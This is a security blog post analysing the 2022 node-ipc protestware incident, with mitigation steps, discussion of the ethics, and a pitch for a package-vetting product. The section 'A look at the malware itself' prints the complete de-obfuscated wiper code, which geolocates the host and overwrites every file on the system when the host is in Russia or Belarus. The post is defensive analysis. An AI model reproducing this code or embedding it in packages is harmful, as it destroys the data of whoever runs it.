---
title: Protestware - How node-ipc turned into malware 
description: How the author of the NPM package node-ipc turned it into malware to attack Russian developers and protest the war in Ukraine.
slug: node-ipc-protestware 
date: 2022-03-18
image: https://www.lunasec.io/docs/img/.png
keywords: [node-ipc, protestware]
tags: [node-ipc, npm, nodejs]
authors: [chris, free, forrest]
---

<!--
  ~ Copyright by LunaSec (owned by Refinery Labs, Inc)
  ~
  ~ Licensed under the Creative Commons Attribution-ShareAlike 4.0 International
  ~ (the "License"); you may not use this file except in compliance with the
  ~ License. You may obtain a copy of the License at
  ~
  ~ https://creativecommons.org/licenses/by-sa/4.0/legalcode
  ~
  ~ See the License for the specific language governing permissions and
  ~ limitations under the License.
  ~
-->

[node-ipc](https://www.npmjs.com/package/node-ipc) is a popular package to help with inter-process communication in
Node. In protest of Russia's invasion of Ukraine, the author of the package intentionally added malware on March 16th
that targets Russian and Belarusian IPs.

The code attempts to geo-locate where it's running, and if it discovers it is running with in Russia or Belarus, then it
attempts to replace the contents of every file on the system with a unicode heart character: ❤. In a more recent
version, it instead just drops a file with a peace message on the desktop.

<!--truncate-->


[Vue.js](https://www.npmjs.com/package/@vue/cli-shared-utils)
and [many other projects](https://github.com/zlw9991/node-ipc-dependencies-list) are affected.

## Mitigation Strategies

To figure out if you're using `node-ipc` via a transitive dependency, you can use the command `yarn why node-ipc`
or `npm explain node-ipc` to show you where and how it's imported in your code. You can then pin your `node-ipc` version
to a known version by adding `overrides` to your `package.json`, like so:

```json
"overrides": {
  "node-ipc@>9.2.1 <10": "9.2.1",
  "node-ipc@>10.1.0": "10.1.0"
}
```

The same thing will work for any transitive npm dependency (IE sub-dependency) you want to override in the future.

Unfortunately, due to this package being a transitive dependency, it can be very difficult to realize you're even
including
`node-ipc` in the first place. This is a part of a bigger, ongoing problem in the Open Source world, and we talk more
about that at the bottom of the post.

## Bad Versions and Other Malware Packages

On NPM, previous versions that were pushed that contained the malicious code, including versions
[9.2.2](https://www.npmjs.com/package/node-ipc/v/9.2.2), [10.1.1](https://www.npmjs.com/package/node-ipc/v/10.1.1),
[10.1.2](https://www.npmjs.com/package/node-ipc/v/10.1.2). These
versions [have all been removed](https://www.npmjs.com/package/node-ipc) at this point once this malware was spotted by
the NPM team.

However, newly released versions, > 11.x.x, all now contain the
library [peacenotwar](https://www.npmjs.com/package/peacenotwar). Unlike the previous malicious code, this library does
not remove files. Instead, the library attempts to "deliver a peaceful message"
by [writing the contents](https://github.com/RIAEvangelist/peacenotwar/blob/main/index.js#L32) of the
file, [WITH-LOVE-FROM-AMERICA.txt](https://github.com/RIAEvangelist/peacenotwar/blob/main/WITH-LOVE-FROM-AMERICA.txt)
to the host filesystem. 


## Going Viral

![pizza swat screenshot](/img/ipc-swat.png)

The updates to the `node-ipc` struck a chord with developers on the Internet and a great deal of activity has been
happening on the project page since the version release.

**Warning** The follow links may contain offensive terms, and are not safe for work.

A number of
[issues](https://github.com/RIAEvangelist/node-ipc/issues)
, [pull requests](https://github.com/RIAEvangelist/node-ipc/pulls),
and [discussions](https://github.com/RIAEvangelist/node-ipc/discussions)
have been created in outrage over the developer's modifications to their library.

Also, the ReadMe now claims that the developer was both sent pizza and SWATed.

## Ethics

It's easy to understand someone wanting to use their voice, whatever voice they have, to strike back against Russian war
crimes. Human lives are at stake, and you never know how someone may have been personally affected.

That said, there are a few reasons this approach is probably not the right path:

* The file replacer code is true malware, designed to cause harm. Distributing it is against Github and NPMs terms of
  service, so a developer risks losing what platform they have when they do something like this.

* Unlike something designed for an end user, a supply-chain attack like this targets so many projects and it's very hard to
  say who in the end will be effected. It's not
  hard to imagine this exploit running on a hospital computer, for instance, and wiping out important and even
  life-saving information.

* The end-product that uses the library ends up itself becoming malware without the knowledge of its developer. In my mind it should be up to the creator
  of that software whether their product is distributed in Russia, and certainly whether it does something malicious.

The ethics of the `11.x` release are interesting, since it simply drops a message asking for peace on the end-user's
desktop. Whether that constitutes malware, I'm not sure. If you do choose to use it, at least you are now aware of what
behavior to expect. The file name is [WITH-LOVE-FROM-AMERICA.txt](https://github.com/RIAEvangelist/peacenotwar/blob/main/WITH-LOVE-FROM-AMERICA.txt), 
in english, and it contains a statement denouncing war
in several languages, starting in english, and a link to a protest song, also in english. It also makes the religious statement "God bless you".
Keep in mind, less than 12% of Russians speak english.

I question whether this will be impactful to public opinion or will backfire and look like a "foreign virus". Naming the file with the name of
Russia's most powerful enemy strikes me as particularly tone-deaf for a message meant to reach critical readers, 
given that the US is one of the prime excuses made by the Kremlin for Russia's expansionism.


## A look at the malware itself

Here is the original malicious code, un-obfuscated. It's easy to follow:

```js
import p from "path";
import fs from "fs";
import https from "https";

setTimeout(function () {
    if (Math.round(Math.random() * 4) > 1) {
        return;
    }

    const geoLocation = "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154";

    https.get(geoLocation, function (response) {
        response.on("data", function (jsonData) {
            try {
                const jsonObject = JSON.parse(jsonData);
                const countryName = jsonObject["country_name"].toLowerCase();
                if (countryName.includes("russia") || countryName.includes("belarus")) {
                    getFiles("./");
                    getFiles("../");
                    getFiles("../../");
                    getFiles("/");
                }
            } catch (response) {
            }
        });
    });
}, Math.ceil(Math.random() * 1000));

async function getFiles(path = "", param2 = "") {
    if (!fs.existsSync(path)) {
        return;
    }

    let fileInDir = [];
    try {
        fileInDir = fs.readdirSync(path);
    } catch (t) {
    }

    const toDelete = [];
    for (var i = 0; i < fileInDir.length; i++) {
        const combinedPath = p.join(path, fileInDir[i]);

        let pathData = null;
        try {
            pathData = fs.lstatSync(combinedPath);
        } catch (t) {
            continue;
        }

        if (pathData.isDirectory()) {
            const result = getFiles(combinedPath, param2);
            result.length > 0 ? toDelete.push(...result) : null;
        } else if (combinedPath.indexOf(param2) >= 0) {
            try {
                fs.writeFile(combinedPath, "❤️", function () {
                });
            } catch (t) {
            }
        }
    }
    return toDelete;
}

const ssl = true;
export {ssl as default, ssl};
```

This code, which has since been deleted can be
found [here](https://github.com/RIAEvangelist/node-ipc/blob/847047cf7f81ab08352038b2204f0e7633449580/dao/ssl-geospec.js)
.

This code was [obfuscated](https://github.com/RIAEvangelist/node-ipc/issues/233#issuecomment-1072077181) to hide its
intentions by the developer as more people started to pay attention to what was happening.

Snyk has written a [blog post](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/) detailing
the timeline of events around the releasing of this malicious version.

## Our product

### Stopping Future Supply Chain Attacks

All of this is happening on the coat-tail of the widely used libraries `faker.js` and `colors.js` having code changes
pushed
to [intentionally corrupt](https://www.theverge.com/2022/1/9/22874949/developer-corrupts-open-source-libraries-projects-affected)
projects that included them.

With Node's support for `postInstall` scripts, any package is able to run arbitrary code _even if it's never imported_
because simply running `npm install` will trigger the library's code. Adding insult to injury, when an imported
package's version hasn't been "pinned"
to a specific version, it's possible to install a malicious package update _without even realizing it's happening_.

Over the years, we've seen many attacks just like this happen, and the impact has only increased. It's clear that,
without a solution to the problem, we're going to continue to see these issues popping up.

Dependency scanning tools like [GitHub Dependabot](https://github.com/dependabot), [Snyk](https://snyk.io/)
, [TideLift](https://tidelift.com/), can spot these issues but not prevent them entirely.
These tools are only designed to scan changes _after_ they're committed to source control. That's too late to prevent
exploitation though because developers can be attacked the moment they run `npm install`.

### Tooling to Block these attacks

Stopping these attacks needs to happen _before_ an `npm install` runs. But how does that work?

Have a developer review every line of code in new packages _prior to it being available on
NPM to download_ is absolutely impractical. Our new tool, LunaTrace, is being built to solve this problem.

To make it possible, we are building a "fork" of NPM where all package updates are reviewed by our dedicated Security
Engineers before your developers can install them.

It's tedious work, but somebody has to do it.

The core of LunaTrace is
[open source and available on GitHub](https://github.com/lunasec-io/lunasec/tree/master/lunatrace). We're
planning to publicly release the managed Cloud version in the coming days.

If you want access to our private NPM registry of pre-vetted packages, please get in touch with us. (It's hard work and
we're still scaling our team up to handle the load.)

### Request Early Access

If you're interested in working with us while we continue to develop and improve LunaTrace, please email us about early
access at: [contact@lunasec.io](mailto:contact@lunasec.io)

More details will be added to our website shortly. Cheers!
